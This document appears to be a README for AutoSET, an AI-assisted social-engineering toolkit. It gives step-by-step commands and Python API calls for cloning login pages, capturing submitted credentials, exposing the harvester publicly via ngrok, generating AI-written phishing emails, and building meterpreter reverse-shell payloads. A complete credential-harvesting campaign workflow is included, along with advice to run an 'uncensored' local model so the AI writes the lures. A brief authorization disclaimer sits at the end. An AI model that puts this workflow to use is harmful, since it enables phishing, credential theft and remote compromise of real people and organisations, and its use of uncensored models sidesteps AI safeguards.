# AutoSET Usage Guide

## Installation

```bash
# Clone repository
git clone https://github.com/djBrandy/autoset.git
cd autoset

# Create virtual environment
python3 -m venv venv
source venv/bin/activate  # On Windows: venv\Scripts\activate

# Install dependencies
pip install -r requirements.txt

# Configure API keys (optional, for cloud LLMs)
cp autoset/config/groq_keys.json.example autoset/config/groq_keys.json
# Edit groq_keys.json with your API key
```

## Quick Start

```bash
# Run demo
python demo.py

# Start AutoSET
python autoset.py

# Or with specific LLM provider
python autoset.py --provider groq
python autoset.py --provider ollama
```

## Commands

### 1. Credential Harvester

Clone a website and start capturing credentials:

```
autoset> /harvest https://example.com
```

This will:
- Clone the target website
- Start a Flask server on port 8080
- Capture any POST data (credentials)
- Save captured data to workspace

**Make it public:**
```
autoset> /tunnel 8080
```

### 2. Phishing Email Generation

Generate AI-powered phishing emails:

```
autoset> /phish target@company.com "urgent password reset required"
```

The AI will generate:
- Convincing subject line
- Professional email body
- Realistic sender information
- Compelling call-to-action

### 3. Payload Generation

Generate payloads using msfvenom:

```
autoset> /payload windows/meterpreter/reverse_tcp 10.0.0.1 4444
```

List available payloads:
```
autoset> /list-payloads windows
autoset> /list-payloads linux
```

### 4. Public Tunneling

Expose local server to internet via ngrok:

```
autoset> /tunnel 8080
```

## Complete Workflow Example

### Scenario: Credential Harvesting Campaign

```bash
# 1. Start AutoSET
python autoset/agent.py

# 2. Clone target login page
autoset> /harvest https://company.com/login

# 3. Make harvester publicly accessible
autoset> /tunnel 8080
# Note the public URL: https://abc123.ngrok.io

# 4. Generate phishing email
autoset> /phish employee@company.com "Your account requires verification"

# 5. Send email with link to public URL
# (Email content saved to workspace)

# 6. Monitor captured credentials
# Check workspace/harvested_creds.json
```

## Configuration

### API Keys

AutoSET supports multiple LLM providers:

**Groq (Recommended - Fast & Free tier)**
```json
{
  "keys": [
    {
      "email": "your-email@example.com",
      "key": "gsk_YOUR_KEY_HERE"
    }
  ],
  "current_key_index": 0
}
```

**Ollama (Local - No API key needed)**
```bash
# Install Ollama
curl https://ollama.ai/install.sh | sh

# Pull a model
ollama pull wizard-vicuna-uncensored:7b

# Run AutoSET with Ollama
python autoset/agent.py --provider ollama
```

### SMTP Configuration

For sending emails, configure SMTP in the code or use:

```python
from autoset.tools.smtp import send_email

send_email(
    to_email="target@example.com",
    subject="Password Reset",
    body="Click here to reset...",
    smtp_server="smtp.gmail.com",
    smtp_port=587,
    use_tls=True,
    username="your-email@gmail.com",
    password="your-app-password"
)
```

## Testing

Run the test suite:

```bash
python test_autoset.py
```

Expected output:
```
✅ Passed: 5
❌ Failed: 0
📊 Total:  5

🎉 All tests passed!
```

## Security & Legal

⚠️ **IMPORTANT**: AutoSET is for authorized penetration testing only.

**Before using AutoSET:**
1. Obtain written authorization
2. Define scope clearly
3. Document all activities
4. Follow responsible disclosure

**Unauthorized use is illegal and unethical.**

## Troubleshooting

### "All LLM providers failed"
- Install Ollama for local LLM
- Or configure API keys for cloud providers

### "Ngrok tunnel failed"
- Install ngrok: `snap install ngrok`
- Or use alternative tunneling service

### "msfvenom not found"
- Install Metasploit Framework
- Or use Kali Linux (pre-installed)

### "Port already in use"
- Change port: `/harvest https://example.com 8081`
- Or kill existing process: `lsof -ti:8080 | xargs kill`

## Advanced Usage

### Custom Workspace

```python
from autoset.utils.workspace import create_workspace

workspace = create_workspace("/custom/path")
```

### Programmatic API

```python
from autoset.tools.harvester import start_harvester
from autoset.tools.web_clone import clone_website

# Clone site
result = clone_website("https://example.com", "/tmp/clone")

# Start harvester
harvester = start_harvester(port=8080, output_file="creds.json")

# Get captured credentials
captured = harvester.get_captured()
```

## Contributing

Contributions welcome! Please:
1. Fork the repository
2. Create a feature branch
3. Add tests for new features
4. Submit a pull request

## License

MIT License - See LICENSE file for details.

## Support

- GitHub Issues: https://github.com/djBrandy/autoset/issues
- Documentation: https://github.com/djBrandy/autoset

---

**Remember: With great power comes great responsibility. Use AutoSET ethically and legally.**
